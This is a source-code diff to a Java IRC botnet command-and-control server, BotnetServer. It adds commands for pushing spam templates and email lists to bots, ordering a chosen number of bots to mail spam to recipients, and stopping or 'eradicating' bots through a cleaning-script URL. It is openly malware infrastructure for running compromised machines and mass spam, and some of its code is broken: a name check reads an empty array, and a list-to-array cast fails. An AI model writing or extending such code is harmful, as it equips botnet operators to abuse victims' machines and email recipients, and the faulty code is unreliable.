@@ -41,12 +41,22 @@ import org.jibble.pircbot.*;
  * 				Usage: spamupload templateFile emailFile bot [more bots]
  * 			</dd>
  * 		<dt>Spam</dt>
- * 			<dd> One can send spam with the XXX, YYY, and ZZZ fields in the template file replaced with the arguments given. These arguments may not contain spaces, they must be one word. 
+ * 			<dd> One can send spam with the XXX, YYY, and ZZZ fields (must be wrapped in single quotes in command) in the template file replaced with the arguments given. These arguments may not contain spaces, they must be one word. 
  * 				The spam will be sent from the given address to the given recipients.
  * 				Giving all as an argument for 'recipient' will send a spam email to everyone in the emails file and giving 'random' will send a spam email to
  * 				a random person in the bots random emails list. The numbots argument specifies how many bots will send the messages, 
  * 				the number will not be respected if it exceeds the size of the botnet.
- * 				Usage: spam numBots xxx yyy zzz subject recipient [more recipients]
+ * 				Usage: spam numBots 'xxx' 'yyy' 'zzz' subject recipient [more recipients]
+ * 			</dd>
+ * 		<dt>Kill</dt>
+ * 			<dd> One can specify a list of bot nicks or just say all. This command simply stops the bot process, 
+ * 				but it will start again when the user restarts his/her machine.
+ * 				Usage: kill bot [more bots]
+ * 			</dd>
+ * 		<dt>Eradicate</dt>
+ * 			<dd> One can specify a list of bot nicks or just say all. The eradicate command kills the bot 
+ * 				process and runs the cleaning script provided.
+ * 				Usage: eradicate cleanURL bot [more bots]
  * 			</dd>
  * </dl>
  * 
@@ -200,8 +210,8 @@ public class BotnetServer extends PircBot {
 		//Respond to a names command by getting the user on CHANNEL and printing their nicks
 		} else if (s.toLowerCase().equals("names")) {
 			String[] bots = getUserNames();
-			for (int i = 0; i < bots.length; i++) {
-				System.out.println("\t" + bots[i]);
+			for (String name : bots) {
+				System.out.println("\t" + name);
 			}
 		//Respond to setop command by acquiring exclusive operator status (DOESN'T WORK)
 		} else if (s.toLowerCase().equalsIgnoreCase("setop")) {
@@ -224,11 +234,11 @@ public class BotnetServer extends PircBot {
 			} else {
 				String[] botNames = chooseBots(parts, 4);
 				String command = parts[0] + " " + parts[1] + " " + parts[2] + " " + parts[3];
-				for (int i = 0; i < botNames.length; i++) {
-					if (!botNames[i].equals(NAME)) {
+				for (String name : botNames) {
+					if (!name.equals(NAME)) {
 						// TODO: encrypt command
-						this.sendMessage(botNames[i], command);
-						//this.sendMessage(botNames[i], masterMsgE.encryptMsg(command));
+						this.sendMessage(name, command);
+						//this.sendMessage(name, masterMsgE.encryptMsg(command));
 					}
 				}
 			}
@@ -239,38 +249,78 @@ public class BotnetServer extends PircBot {
 				System.out.println("Usage: spamupload template emails bot [more bots]");
 			} else {
 				String[] botNames = chooseBots(parts, 3);
-				for (int i = 0; i < botNames.length; i++) {
-					if (!botNames[i].equals(NAME)) {
-						dccSendFile(new File(parts[1]), botNames[i], TIMEOUT);
-						dccSendFile(new File(parts[2]), botNames[i], TIMEOUT);
+				for (String name : botNames) {
+					if (!name.equals(NAME)) {
+						dccSendFile(new File(parts[1]), name, TIMEOUT);
+						dccSendFile(new File(parts[2]), name, TIMEOUT);
 					}
 				}
 			}
 		//Respond to spam command by selecting numbots bots and issuing the command	
 		} else if (s.toLowerCase().startsWith("spam")) {
+			try {
+				String[] peices = s.split("'");
+				String[] firstArgs = Arrays.copyOfRange(peices[0].split(" "), 0, 2);
+				String[] lastArgs = peices[7].split(" ");
+				lastArgs = Arrays.copyOfRange(lastArgs, 1, lastArgs.length);
+				
+				List<String> list = new ArrayList<String>();
+				for (String arg : firstArgs) {
+					list.add(arg);
+				}
+				list.add(peices[1]);
+				list.add(peices[3]);
+				list.add(peices[5]);
+				for (String arg : lastArgs) {
+					list.add(arg);
+				}
+				
+				String[] parts = (String[])(list.toArray());
+				
+				if (parts.length < 7) {
+					System.out.println("Usage: spam numBots 'xxx' 'yyy' 'zzz' subject recipient [more recipients]");
+				} else {
+					String[] bots = getUserNames();
+					if (!parts[1].equalsIgnoreCase("all")) {
+						int numBots = Integer.parseInt(parts[1]);
+						if (bots.length > numBots) {
+							bots = Arrays.copyOfRange(bots, 0, numBots + 1);
+						}
+					}
+					String command = parts[0];
+					for (int i = 2; i < parts.length; i++) {
+						command += parts[i];
+					}
+					for (String name : bots) {
+						// TODO: encrypt command
+						sendMessage(name, command);
+						//sendMessage(name, masterMsgE.encryptMsg(command));
+					}
+				}
+			} catch (Exception e) {
+				System.out.println("Usage: spam numBots 'xxx' 'yyy' 'zzz' subject recipient [more recipients]");
+			}
+		//Respond to a kill command by sending it to the bots
+		} else if (s.toLowerCase().startsWith("kill")) {
 			String[] parts = s.split(" ");
-			if (parts.length < 7) {
-				System.out.println("Usage: spam numBots xxx yyy zzz subject recipient [more recipients]");
-			} else {
-				int numBots = Integer.parseInt(parts[1]);
-				String[] bots = getUserNames();
-				if (bots.length > numBots) {
-					bots = Arrays.copyOfRange(bots, 0, numBots + 1);
-				}
-				String command = parts[0];
-				for (int i = 2; i < parts.length; i++) {
-					command += parts[i];
-				}
-				for (int i = 0; i < bots.length; i++) {
-					// TODO: encrypt command
-					sendMessage(bots[i], command);
-					//sendMessage(bots[i], masterMsgE.encryptMsg(command));
-				}
+			String[] bots = chooseBots(parts, 1);
+			for (String name : bots) {
+				sendMessage(name, parts[0]);
+			}
+		//Respond to an eradicate command by sending it along with the clean script url to each bot
+		} else if (s.toLowerCase().startsWith("eradicate")) {
+			String[] parts = s.split(" ");
+			String[] bots = chooseBots(parts, 2);
+			for (String name : bots) {
+				sendMessage(name, parts[0] + " " + parts[1]);
 			}
 		//Respond to a message beginning with a colon by messaging the CHANNEL
 		} else if (s.startsWith(":")) {
 			// TODO: encrypt s.substring
-			sendMessage(CHANNEL, s.substring(1));
+			String[] bots = getUserNames();
+			for (String name : bots) {
+				sendMessage(name, s.substring(1));
+			}
 			//sendMessage(CHANNEL, masterMsgE.encryptMsg(s.substring(1)));
 		//Respond to all other messages by sending the message raw to the IRC server
 		} else if (!s.isEmpty()) {
@@ -290,9 +340,11 @@ public class BotnetServer extends PircBot {
 	
 	public String[] getUserNames() {
 		User[] bots = getUsers(CHANNEL);
-		String[] names = new String[bots.length];
+		String[] names = new String[bots.length - 1];
 		for (int i = 0; i < bots.length; i++) {
-			names[i] = bots[i].getNick();
+			if (!names[i].equalsIgnoreCase(NAME)) {
+				names[i] = bots[i].getNick();
+			}
 		}
 		return names;
 	}
